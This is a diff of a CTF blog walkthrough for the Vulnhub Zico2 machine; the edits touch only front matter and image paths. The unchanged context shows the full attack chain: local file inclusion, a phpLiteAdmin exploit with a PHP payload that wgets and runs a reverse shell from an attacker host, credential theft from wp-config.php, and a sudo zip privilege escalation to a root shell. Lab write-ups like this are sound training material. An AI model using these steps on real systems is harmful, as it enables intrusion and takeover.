@@ -1,12 +1,12 @@
 ---
-layout: post
-title: "Zico2 writeup"
-subtitle: "~ Walkthrough of Zico2 machine ~"
-date: 2017-10-07
-author: V3ded
-category: CTF
-tags: blog ctf pentesting 
-finished: true
+layout: single
+title: "Vulnhub - Zico2"
+header:
+  overlay_image: /assets/img/thumbnails/thmbn-01.jpg
+  caption: "[__Vulnhub__](https://www.vulnhub.com/entry/zico2-1,210/)"
+excerpt: "Hack the planet!"
+related: true
+comments: true
 ---
 
 # Intro
@@ -122,16 +122,16 @@ Port 20,80 and 111 open - time to enumerate them. With multiple ports available,
 
 Webpage:
 
-<img src="/img/blog/zico2/Zico1.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico1.png">
 
 Time to look around! Top header bar shows us 4 options - about, services, portfolio and contact. All of these just redirect you somewhere within the index page and therefore it's useless to click them. Scrolling down, there is a segment with a button which says _Ok... Show me the tools?! - CHECK THEM OUT!_. This is a redirect to `http://192.168.1.17/view.php?page=tools.html`. 
 
-<img src="/img/blog/zico2/Zico2.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico2.png">
 
 Interesting enough, the URL is possibly prone to [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) from the looks of it. `http://192.168.1.17/view.php?page=../../../../etc/passwd` writes out the content of passwd file which proves the previous statement of possible LFI. Unfortunately LFI only allows us to read files, not upload them. Blindly browsing through the filesystem won't result in anything. I attempted many tricks such as *php://expect*, *php://filter*, */proc/self/environ* code execution to improve the current situation... Unfortunately, the results came out blank. Check [LFI cheatsheet](https://highon.coffee/blog/lfi-cheat-sheet/) from HighOnCoffee if any of these things are unclear to you.
 
 LFI PoC:
-<img src="/img/blog/zico2/Zico3.png">      
+<img src="/assets/img/blog/vulnhub-zico2/Zico3.png">      
 
 After an exhausting manual search and not any more clues left, I look back on my `dirb` result. Look at this wonderful pile of information!
 
@@ -193,11 +193,11 @@ DOWNLOADED: 4612 - FOUND: 8
 ```
 As a result of this we find many hidden accessible directories such as **/dbadmin/**, **/js/**, **/vendor/** and **/view/**. **/dbadmin/** sounds like an interesting one, so let's see what it shows. 
 
-<img src="/img/blog/zico2/Zico4.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico4.png">
 
 The php file leads to:
 
-<img src="/img/blog/zico2/Zico5.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico5.png">
 
 Before any bruteforcing attempt, I usually search for already known exploit corresponding to a service version. There are many ways of doing this, like using searchsploit or Google. 
 Searchsploit query for *phpLiteAdmin v1.9.3*
@@ -222,15 +222,15 @@ If you have read the searchsploit file, getting the shell will be easy. There ar
 
 To proceed with our exploitation, do as the exploitdb file says. Create a database with a .php extension (in my case shell.php):  
 
-<img src="/img/blog/zico2/Zico6.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico6.png">
 
 Add a table inside it called shell, select 1 field:      
 
-<img src="/img/blog/zico2/Zico7.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico7.png">
 
 Name the field whatever we wish, set it as *text* type, put `<?php system("wget 192.168.1.12/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>` into the default value & click create. This should create a new table with our exploit. The default value script plays a huge role here as it is used to download our main php reverse shell.
 
-<img src="/img/blog/zico2/Zico8.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico8.png">
  
 `wget - downloads the the main file on the target machine`
 
@@ -241,7 +241,7 @@ Name the field whatever we wish, set it as *text* type, put `<?php system("wget 
 In order to activate our side script which downloads the malicious file, an HTTP request is needed. How would we do this though? I quickly reminded myself of the LFI vulnerability which allows me to browse the file system. All databases are located at **/usr/share/databases/** as it can be seen on the phpliteadmin side panel. See where I'm going? Start our netcat listener `nc -lvp 1234` and make an HTTP request via `192.168.1.17/view.php?page=../../../../usr/databases/shell.php`
 
 
-<img src="/img/blog/zico2/Zico9.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico9.png">
 
 BOOM! A reverse connection has been made! :)
 
@@ -250,22 +250,22 @@ BOOM! A reverse connection has been made! :)
 
 Time to snoop! (I stole that phrase from [g0blin](https://twitter.com/g0blinresearch) heh :P). There is nothing of interest inside **/var/** and **/tmp/** folders. All that remains is closer inspection of /home/zico/ which is present with many CMS files. 
 
-<img src="/img/blog/zico2/Zico10.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico10.png">
 
 After some exploration I discovered a wp-config.php (inside **/wordpress/**) file which has zico's login credentials.
 
-<img src="/img/blog/zico2/Zico11.png"> 
+<img src="/assets/img/blog/vulnhub-zico2/Zico11.png"> 
 
 Use them to connect via ssh: `ssh zico@192.168.1.17` and enumerate more with a nice TTY shell and job control. `sudo -l` shows that we can use zip or tar combined with sudo without providing a password. 
 
-<img src="/img/blog/zico2/Zico12.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico12.png">
 
 This creates a security hole prone to privilege escalation vulnerability! Just make a random file using touch command (`touch exploit`) and zip it using this command:
  ```console
 zico@zico:/tmp$ sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"
 ```
 
-<img src="/img/blog/zico2/Zico13.png">
+<img src="/assets/img/blog/vulnhub-zico2/Zico13.png">
 
 `sudo - executes as superuser`
 
